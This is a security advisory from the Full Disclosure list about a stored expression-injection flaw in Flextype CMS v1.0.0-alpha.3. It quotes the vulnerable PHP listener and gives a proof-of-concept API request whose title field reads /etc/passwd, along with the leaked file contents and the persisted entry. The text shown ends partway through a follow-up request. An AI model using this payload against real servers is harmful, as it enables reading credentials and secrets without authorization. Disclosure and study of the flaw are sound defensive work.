---
title: Flextype v1.0.0-alpha.3 Stored Arbitrary Expression Injection in ExpressionsDirective Allows Arbitrary File Read
url: https://seclists.org/fulldisclosure/2026/Sep/20
source: Full Disclosure
date: 2026-09-04
fetch_date: 2026-09-05T06:30:33.441899
---

# Flextype v1.0.0-alpha.3 Stored Arbitrary Expression Injection in ExpressionsDirective Allows Arbitrary File Read

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](19)
[By Date](date.html#20)
[![Next](/images/right-icon-16x16.png)](21)

[![Previous](/images/left-icon-16x16.png)](19)
[By Thread](index.html#20)
[![Next](/images/right-icon-16x16.png)](21)

![](/shared/images/nst-icons.svg#search)

# Flextype v1.0.0-alpha.3 Stored Arbitrary Expression Injection in ExpressionsDirective Allows Arbitrary File Read

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Sun, 30 Aug 2026 22:09:12 -0400

---

```
Description

Flextype CMS v1.0.0-alpha.3 contains a stored arbitrary expression
injection vulnerability in the Entries ExpressionsDirective. An
authenticated remote attacker with sufficient privileges to create or
modify entries can persist arbitrary expression syntax within an entry
field. When the affected field is subsequently retrieved or processed,
Flextype passes the stored value to parsers()->expressions()->parse(),
causing the attacker-controlled expression to be evaluated server-side.

The expression environment exposes application functionality including the
filesystem() object. An attacker can therefore store an expression that
accesses arbitrary files readable by the Flextype PHP process. Testing
confirmed exploitation by storing an expression referencing /etc/passwd
within an entry's title field. The expression remained persisted within the
underlying entry file and was evaluated when the entry was processed,
resulting in disclosure of /etc/passwd.

This represents a stored execution path because the expression itself
crosses the persistence boundary and remains within the entry rather than
requiring the attacker to supply the complete expression during each
subsequent request.
Impact

An authenticated remote attacker can persist arbitrary expressions within
Flextype entry fields that are subsequently evaluated by the server-side
expression engine.

The demonstrated vulnerability allows arbitrary files accessible to the
Flextype PHP process to be read. This could expose sensitive server-side
information including application configuration files, credentials, API
keys, database connection information, source code, operating-system
information, and other secrets available to the application account.

Because the malicious expression is persisted within the entry, subsequent
processing of the affected field can cause the expression to be evaluated
again. Additional impact may be possible depending on the objects and
functionality exposed to the expression environment.

DetailsVulnerable Expressions Directive Implementation

Flextype registers an onEntriesFetchSingleField listener responsible for
processing expressions contained within individual entry fields.

When expression directives and global expression processing are enabled,
the implementation retrieves the current entry field, constructs variables
from the entry data, and passes string field values directly to the
expression parser.

<?php

declare(strict_types=1);

/**
 * Flextype - Hybrid Content Management System with the freedom of a
headless CMS
 * and with the full functionality of a traditional CMS!
 *
 * Copyright (c) Sergey Romanenko (https://awilum.github.io)
 *
 * Licensed under The MIT License.
 *
 * For full copyright and license information, please see the LICENSE
 * Redistributions of files must retain the above copyright notice.
 */

namespace Flextype\Entries\Directives;

use function Glowy\Strings\strings;
use function Flextype\emitter;
use function Flextype\entries;
use function Flextype\parsers;
use function Flextype\registry;
use function Flextype\collection;

// Directive: [[ ]] [% %] [# #]
emitter()->addListener('onEntriesFetchSingleField', static function (): void {

    if (! registry()->get('flextype.settings.entries.directives.expressions.enabled'))
{
        return;
    }

    if (! registry()->get('flextype.settings.entries.directives.expressions.enabled_globally'))
{
        return;
    }

    $field = entries()->registry()->get('methods.fetch.field');

    if (is_string($field['value']) &&
strings($field['value'])->contains('!expressions')) {
        return;
    }

    $vars = [];

    // Convert entry fields to vars.
    foreach (json_decode(json_encode((object)
entries()->registry()->get('methods.fetch.result')), false) as $key =>
$value) {
        $vars[$key] = $value;
    }

    if (is_string($field['value'])) {
        $field['value'] =
parsers()->expressions()->parse($field['value'], $vars);
    }

    entries()->registry()->set('methods.fetch.field.key', $field['key']);
    entries()->registry()->set('methods.fetch.field.value', $field['value']);
});

The security-sensitive operation occurs when the stored field value is
passed directly to the expression parser:

if (is_string($field['value'])) {
    $field['value'] = parsers()->expressions()->parse($field['value'], $vars);
}

Proof of Concept — Store Arbitrary Expression

An authenticated attacker can create an entry through /api/v1/entries and
supply expression syntax within an attacker-controlled field.

The following request places a filesystem() expression within the title
field that reads /etc/passwd:

POST /api/v1/entries HTTP/1.1
Host: 127.0.0.1:18080
Content-Type: application/json

{"token":"lab-token","access_token":"password","id":"expr-api-proof","data":{"title":"[[
filesystem().file('/etc/passwd').get() ]]","content":"created through
API"}}

The application evaluates the supplied expression and returns the contents
of /etc/passwd:

HTTP/1.1 200 OK
Host: 127.0.0.1:18080
Date: Mon, 31 Aug 2026 01:49:16 GMT
Connection: close
X-Powered-By: PHP/8.1.34
Content-Type: application/json;charset=UTF-8
Content-Length: 1141
Access-Control-Allow-Origin: *

{"title":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing
List
Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n","content":"created
through API","slug":"expr-api-proof","visibility":"visible","id":"expr-api-proof"}

Proof of Concept — Expression Persistence

Inspection of the resulting Flextype entry demonstrates that the expression
itself is persisted on disk rather than being replaced by the evaluated
/etc/passwd contents:

realpath: /app/project/entries/expr-api-proof/entry.md
---
---
title: "[[ filesystem().file('/etc/passwd').get() ]]"
published_by: ''
created_by: ''
uuid: 15420ada-de60-4bc6-b7b2-387df908e0e3
---
created through API

This demonstrates that the expression remains part of the stored entry and
is not limited to a reflected or one-time expression evaluation condition.
Proof of Concept — Stored Expression Evaluation

The stored entry can subsequently be retrieved using its normal entry
identifier without resupplying the expression:

GET /api/v1/entries?token=lab-token&id=expr-api-proof HTTP/1.1
Host: 127.0.0.1:18080

Fl...